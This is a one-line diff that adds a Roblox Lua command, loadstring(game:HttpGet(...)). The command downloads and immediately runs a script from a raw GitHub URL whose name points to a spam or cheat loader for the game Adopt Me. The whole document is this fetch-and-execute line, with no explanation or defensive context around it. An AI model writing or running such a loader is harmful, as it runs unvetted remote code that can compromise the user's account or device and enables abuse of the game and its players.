@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/adopt-me-spam7-uhczy6izo562ui.lua"))()
